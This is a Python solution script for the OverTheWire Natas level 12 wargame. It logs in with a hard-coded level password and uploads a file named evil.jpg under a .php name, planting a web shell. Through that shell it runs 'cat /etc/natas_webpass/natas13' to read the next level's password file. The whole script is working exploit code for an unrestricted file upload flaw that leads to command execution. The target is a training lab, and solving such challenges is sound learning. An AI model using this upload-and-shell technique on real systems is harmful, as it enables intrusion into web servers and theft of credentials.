import requests
import re

username = "natas12"
password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
url = f"http://{username}.natas.labs.overthewire.org/"

payload = open("C:\\Users\\bens\\Desktop\\natas\\evil.jpg", "rb")

session = requests.Session()

response = session.post(url, auth=(username, password), files={'uploadedfile': payload}, data={'filename': 'evil.php', 'submit': 'submit'})

content = response.text

uploaded = re.findall(r'<a href="upload/(.*).php">', content)[0]

cmd = "cat /etc/natas_webpass/natas13"

shell = session.get(url + "upload/" + uploaded + f".php?cmd={cmd}", auth=(username, password))

shell_response = shell.text

flag = re.findall(r"\n(.*)\n", shell_response)[0]

print(flag)